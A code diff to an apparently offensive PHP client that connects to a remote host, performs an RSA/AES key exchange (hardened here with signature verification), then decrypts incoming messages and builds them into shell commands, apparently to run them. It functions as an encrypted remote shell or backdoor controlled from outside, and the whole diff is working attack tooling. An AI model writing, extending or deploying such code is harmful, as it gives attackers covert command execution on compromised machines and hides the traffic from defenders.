@@ -7,6 +7,7 @@
     define('OPTIONS', OPENSSL_RAW_DATA);
     define('HASH_ALGO', 'sha256');
     define('HASH_LEN', 32);
+    define('SHA512LEN', 512);
 
 	$opts = getopt("h:p:", ["host:", "port:"]);
 
@@ -19,24 +20,33 @@
 
     echo "[\33[91m!\33[0m] connected.\n";
     if(($base64metadata = @socket_read($socket, BUFFER_LEN)) === false){ die(); }
+
     $_metadata = base64_decode($base64metadata);
     $metadata = [
-        'encrypted_AES_key' => substr($_metadata, 0, 684),
-        'public_RSA_key_string' => substr($_metadata, 684),
+        'signature' => substr($_metadata, 0, SHA512LEN),
+        'encrypted_AES_key' => substr($_metadata, SHA512LEN, 684),
+        'public_RSA_key_string' => substr($_metadata, SHA512LEN + 684),
     ];
-
-    /*$metadata['public_RSA_key_string'] = 
-    "-----BEGIN PUBLIC KEY-----"
-    .$metadata['public_RSA_key_string']
-    ."\n-----END PUBLIC KEY-----";*/
-
+    $RSA_pub_stripped = $metadata['public_RSA_key_string'];
+    $metadata['public_RSA_key_string'] = "-----BEGIN PUBLIC KEY-----"
+                                        .$metadata['public_RSA_key_string']
+                                        ."-----END PUBLIC KEY-----";
+    if(1 !== openssl_verify(
+        $metadata['encrypted_AES_key'].$RSA_pub_stripped,
+        $metadata['signature'],
+        $metadata['public_RSA_key_string'],
+        OPENSSL_ALGO_SHA512
+    )) { die(); }
     if(false === (
         $AESKey = decryptRSAClient(
         $metadata['public_RSA_key_string'],
-        $metadata['encrypted_AES_key']))
-      ) { die(); }
+        $metadata['encrypted_AES_key'])
+    )) { die(); }
 
-    var_dump($AESKey);
+    unset($metadata);
+    unset($_metadata);
+    unset($base64metadata);
+    unset($RSA_pub_stripped);
 
 	while(1)
 	{
@@ -54,7 +64,8 @@
 	    {
 			if(($recv = decrypt_cbcClient($recv, $AESKey)) !== false)
 			{
-				if(preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE)){ break; }
+                if(preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
+                { break; }
 
 				$full_cmd = "{ ".preg_replace('/(;)+(\s)*/', ';', trim($recv));
 				$full_cmd .= substr($full_cmd, -1) !== ';' ? "; } 2>&1;" : " } 2>&1;";
